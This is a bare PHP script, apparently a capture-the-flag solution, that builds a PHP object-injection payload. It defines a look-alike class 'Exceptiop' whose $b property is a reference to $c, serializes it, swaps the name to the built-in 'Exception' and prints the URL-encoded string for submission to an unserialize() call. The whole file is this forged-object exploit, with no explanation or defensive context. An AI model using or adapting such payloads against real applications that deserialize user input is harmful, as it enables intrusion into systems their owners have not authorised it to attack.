<?php

class Exceptiop{
	protected  $code ;
	protected  $line ;
	public $c;
	public $b;
	public function __construct(){
		$this->b = &$this->c;
		$this->code = 1;
		$this->line = 1;
	}


}

$t = new Exceptiop();
$t1 = str_replace("Exceptiop","Exception",serialize($t));
echo urlencode($t1);

?>